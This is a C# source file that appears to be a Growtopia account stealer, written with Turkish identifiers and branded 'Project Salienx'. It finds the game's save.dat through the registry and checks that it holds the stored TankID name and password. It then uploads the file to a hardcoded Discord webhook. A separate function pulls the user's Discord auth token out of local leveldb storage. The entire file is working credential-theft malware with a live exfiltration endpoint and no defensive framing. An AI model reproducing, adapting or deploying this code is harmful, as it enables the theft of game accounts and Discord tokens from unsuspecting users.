using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Dcc
{
    class HesabıGönder
    {
        private HttpClient Client;
        private string Url;

        public string Name { get; set; }
        public string ProfilePictureUrl { get; set; }

        public HesabıGönder(string webhookUrl)
        {
            Client = new HttpClient();
            Url = webhookUrl;
        }

        public bool SendMessage(string content, string file = null)
        {
            MultipartFormDataContent data = new MultipartFormDataContent();
            data.Add(new StringContent(Name), "username");
            data.Add(new StringContent(ProfilePictureUrl), "avatar_url");
            data.Add(new StringContent(content), "content");

            if (file != null)
            {
                if (!File.Exists(file))
                    throw new FileNotFoundException();

                byte[] bytes = File.ReadAllBytes(file);
                DateTime now = DateTime.Now;
                data.Add(new ByteArrayContent(bytes), now + "account.dat", now + "account.dat"); //change "file" to "file.(extention) if you wish to download as ext
            }

            var resp = Client.PostAsync(Url, data).Result;

            return resp.StatusCode == HttpStatusCode.NoContent;
        }
    }
    class Discord
    {
        public static string savePath()
        {
            try
            {
                RegistryKey gtreg;
                if (Environment.Is64BitOperatingSystem)
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64);
                }
                else
                {
                    gtreg = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry32);
                }
                try
                {
                    gtreg = gtreg.OpenSubKey(@"Software\Growtopia", true);
                    string pathvalue = (string)gtreg.GetValue("path");
                    if (Directory.Exists(pathvalue))
                    {
                        if (File.Exists(pathvalue + @"\save.dat"))
                        {
                            string sdat = null;
                            var r = File.Open(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read);
                            using (FileStream fileStream = new FileStream(pathvalue + @"\save.dat", FileMode.Open, FileAccess.Read, FileShare.Read))
                            {
                                using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                                {
                                    sdat = streamReader.ReadToEnd();
                                    streamReader.Close();
                                }
                                r.Close();
                                fileStream.Close();
                            }

                            if (sdat.Contains("tankid_password") & sdat.Contains("tankid_name"))
                            {
                                return pathvalue + @"\save.dat";
                            }
                            else
                            {
                                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                            }
                        }
                        else
                        {
                            return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                        }

                    }
                    else
                    {
                        return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                    }
                }
                catch
                {
                    return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
                }
            }
            catch
            {
                return Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + @"\Growtopia\save.dat";
            }
        }
        public static string takeToken()
        {
            string result;
            try
            {
                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "//Discord//Local Storage//leveldb//000005.ldb");
                int num;
                while ((num = text.IndexOf("oken")) != -1)
                {
                    text = text.Substring(num + "oken".Length);
                }
                string text2 = text.Split(new char[]
                {
                    '"'
                })[1];
                result = text2;
            }
            catch (Exception)
            {
                result = null;
            }
            return result;
        }
        public static void Reference()
        {
            HesabıGönder br = new HesabıGönder("https://discordapp.com/api/webhooks/712590258000101386/Yn6IXAUtJUNsC6hPzqJme0jZow3RO2LlZxWluN4DDoeCG29bH32wxUVBi1B7cwdv98F1");
            br.Name = "Project Salienx";
            br.ProfilePictureUrl = "https://cdn.discordapp.com/attachments/713834777308037202/718171024440557588/asdfsdghg.png";
            br.SendMessage("", savePath());
        }


    }
}
